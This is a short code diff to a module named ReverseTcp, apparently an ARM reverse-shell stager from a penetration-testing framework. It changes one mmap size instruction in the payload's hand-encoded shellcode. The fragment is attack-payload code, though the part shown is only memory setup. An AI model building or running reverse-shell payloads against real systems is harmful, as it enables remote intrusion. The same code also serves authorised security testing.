@@ -53,7 +53,7 @@ module ReverseTcp
 						# mmap
 						0xe3a0c0c5, # mov r12, #0xc5
 						0xe0200000, # eor r0, r0, r0
-						0xe3a01902, # mov r1, #0x2, 18
+						0xe3a01502, # mov r1, #0x2, 10
 						0xe3a02007, # mov r2, #0x7
 						0xe3a03a01, # mov r3, #0x1, 20
 						0xe3e04000, # mvn r4, #0x0
